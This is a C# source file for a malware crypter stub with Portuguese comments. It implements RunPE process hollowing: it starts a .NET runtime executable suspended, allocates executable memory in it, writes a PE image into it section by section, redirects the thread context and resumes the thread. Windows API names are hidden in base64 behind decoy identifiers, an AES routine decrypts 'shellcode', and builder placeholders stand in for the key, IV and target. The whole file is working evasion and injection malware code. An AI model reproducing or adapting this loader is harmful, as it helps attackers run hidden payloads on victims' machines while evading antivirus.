using System;
using System.Collections.Generic;
using System.IO; // MemoryStream
using System.Linq;
using System.Runtime.InteropServices; // DllImport
using System.Security.Cryptography; // Aes
using System.Text; // Encoding.ASCII
using System.Threading.Tasks;
using System.Windows.Forms;

/* using´s da Runpe
using System.Runtime.InteropServices; // DllImport
using System.Text; // Encoding.ASCII
*/


namespace Stub
{
    static class Program
    {
        /// <summary>
        /// Ponto de entrada principal para o aplicativo.
        /// </summary>
        [STAThread]
        static void Main()
        {
			/*
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
            */

			byte[] key = Convert.FromBase64String("%KEY%");
			byte[] Iv = Convert.FromBase64String("%IV%");

			string injectMethod = "%INJECT%";
			byte[] dataEncoded = new byte[] { };
			Kenneth.August.Crystal(dataEncoded, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), injectMethod));
		}
    }
}

namespace Kenneth
{
	public class August : Li
	{

		private static bool WordsAreCool(int[] context)
		{
			if (IntPtr.Size == 0x4)
			{
				context[0] = 0x10002;
				if (!GetThreadCon(pi.ThreadHandle, context))
				{
					return false;
				}
				else
				{
					return true;
				}
			}
			else
			{
				return false;
			}
		}

		public static void Crystal(byte[] section, string exeFileName)
		{
			int i = 0;

			while (i < 4)
			{
				int readWrite = 0;

				int[] context = new int[0xB3];
				try
				{

					if (!Create(exeFileName, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, ref pi)) { throw new Exception(); };
					if (!WordsAreCool(context)) { throw new Exception(); }
					int Address = BitConverter.ToInt32(section, 0x3C);
					int Base = BitConverter.ToInt32(section, Address + 0x34);

					int sizeOfImage = (int)typeof(BitConverter).GetMethod("ToInt32").Invoke(null, new object[] { section, Address + 0x50 });
					int sizeOfHeaders = (int)typeof(BitConverter).GetMethod("ToInt32").Invoke(null, new object[] { section, Address + 0x54 });


					int NewImage = AllocateEx(pi.ProcessHandle, Base, (int)typeof(BitConverter).GetMethod("ToInt32").Invoke(null, new object[] { section, Address + 0x50 }), 0x3000, 0x40);
					if (NewImage == 0) { throw new Exception(); }
					int Offset = Address + 0xF8;

					if (SectionBlock(NewImage, section, Offset, readWrite, Address))
					{
						if (!Write(pi.ProcessHandle, NewImage, section, sizeOfHeaders, ref readWrite)) throw new Exception();

						if (!Write(pi.ProcessHandle, context[0x29] + 0x8, BitConverter.GetBytes(NewImage), 0x4, ref readWrite)) throw new Exception();
						if (ResThreading(pi.ThreadHandle) == -1) throw new Exception();
					}
					else
					{
						throw new Exception();
					};

					i++;
				}
				catch
				{
					System.Diagnostics.Process.GetProcessById(Convert.ToInt32(pi.ProcessId)).Kill();
					continue;
				}

				break;

			}
		}
		public static bool SectionBlock(int NewImage, byte[] data, int Offset, int readWrite, int Address)
		{
			short nSec = (short)typeof(BitConverter).GetMethod("ToInt16").Invoke(null, new object[] { data, Address + 0x6 });
			int I = 0;
			do
			{
				int VirtAddr = BitConverter.ToInt32(data, Offset + 0xC);
				int SizeRaw = BitConverter.ToInt32(data, Offset + 0x10);
				int PointRawData = BitConverter.ToInt32(data, Offset + 0x14);
				if (SizeRaw != 0x0)
				{
					byte[] sectionData = new byte[SizeRaw];
					Array.Copy(data, PointRawData, sectionData, 0x0, sectionData.Length);
					if (!Write(pi.ProcessHandle, NewImage + VirtAddr, sectionData, sectionData.Length, ref readWrite)) throw new Exception();
				}
				Offset += 0x28;
				I++;
			}
			while (I < nSec);
			return true;
		}
	}
}
public class Li
{

	public static Startup si;
	public static Process pi;

	[StructLayout(LayoutKind.Sequential, Pack = 0x1)]
	public struct Process
	{
		public readonly IntPtr ProcessHandle;
		public readonly IntPtr ThreadHandle;
		public readonly uint ProcessId;
		private readonly uint ThreadId;
	}
	[StructLayout(LayoutKind.Sequential, Pack = 0x1)]
	public struct Startup
	{
		public uint Size;
		private readonly string Reserved1;
		private readonly string Desktop;
		private readonly string Title;
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x24)] private readonly byte[] Misc;
		private readonly IntPtr Reserved2;
		private readonly IntPtr StdInput;
		private readonly IntPtr StdOutput;
		private readonly IntPtr StdError;
	}


	private class Names
	{
		public static string kernel32 = Encoding.ASCII.GetString(Convert.FromBase64String("a2VybmVsMzI="));
		public static string ntdll = Encoding.ASCII.GetString(Convert.FromBase64String("bnRkbGw="));
		public static string Philibert = Encoding.ASCII.GetString(Convert.FromBase64String("Q3JlYXRlUHJvY2Vzc0E="));
		public static string Aregisel = Encoding.ASCII.GetString(Convert.FromBase64String("UmVzdW1lVGhyZWFk"));
		public static string Bertha = Encoding.ASCII.GetString(Convert.FromBase64String("V293NjRTZXRUaHJlYWRDb250ZXh0"));
		public static string Wichmann = Encoding.ASCII.GetString(Convert.FromBase64String("U2V0VGhyZWFkQ29udGV4dA=="));
		public static string Valdemar = Encoding.ASCII.GetString(Convert.FromBase64String("V293NjRHZXRUaHJlYWRDb250ZXh0"));
		public static string Jordan = Encoding.ASCII.GetString(Convert.FromBase64String("R2V0VGhyZWFkQ29udGV4dA=="));
		public static string Bailey = Encoding.ASCII.GetString(Convert.FromBase64String("VmlydHVhbEFsbG9jRXg="));
		public static string Flodoard = Encoding.ASCII.GetString(Convert.FromBase64String("V3JpdGVQcm9jZXNzTWVtb3J5"));
		public static string Grifo = Encoding.ASCII.GetString(Convert.FromBase64String("UmVhZFByb2Nlc3NNZW1vcnk="));
		public static string Isembold = Encoding.ASCII.GetString(Convert.FromBase64String("WndVbm1hcFZpZXdPZlNlY3Rpb24="));
	}

	protected delegate bool Philibert(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref Startup startupInfo, ref Process processInformation);
	protected static readonly Philibert Create = LoadApi.App<Philibert>(Names.kernel32, Names.Philibert);

	protected delegate int Aregisel(IntPtr handle);
	protected static readonly Aregisel ResThreading = LoadApi.App<Aregisel>(Names.kernel32, Names.Aregisel);


	protected delegate bool Wichmann(IntPtr thread, int[] context);
	protected static readonly Wichmann SetThread = LoadApi.App<Wichmann>(Names.kernel32, Names.Wichmann);


	protected delegate bool Jordan(IntPtr thread, int[] context);
	protected static readonly Jordan GetThreadCon = LoadApi.App<Jordan>(Names.kernel32, Names.Jordan);

	protected delegate int Bailey(IntPtr handle, int address, int length, int type, int protect);
	protected static readonly Bailey AllocateEx = LoadApi.App<Bailey>(Names.kernel32, Names.Bailey);

	protected delegate bool Flodoard(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
	protected static readonly Flodoard Write = LoadApi.App<Flodoard>(Names.kernel32, Names.Flodoard);


	protected delegate int Isembold(IntPtr process, int baseAddress);
	protected static readonly Isembold View = LoadApi.App<Isembold>(Names.ntdll, Names.Isembold);


	class LoadApi
	{
		[DllImport("kernel32", SetLastError = true)]
		private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
		[DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
		private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
		public static CreateApi App<CreateApi>(string name, string method)
		{
			return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));

		}
	}

}


namespace Encrypt
{

    class AES
    {

        public static byte[] Decript(byte[] shellcode, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;

                aes.Key = key;
                aes.IV = iv;

                using (var encriptor = aes.CreateDecryptor())
                {
                    using (var msEncShellcode = new MemoryStream())
                    {
                        using (var cryptoStream = new CryptoStream(msEncShellcode, encriptor, CryptoStreamMode.Write))
                        {
                            cryptoStream.Write(shellcode, 0, shellcode.Length);
                            cryptoStream.FlushFinalBlock();
                            return msEncShellcode.ToArray();
                        }
                    }
                }
            }
        }


    }


}

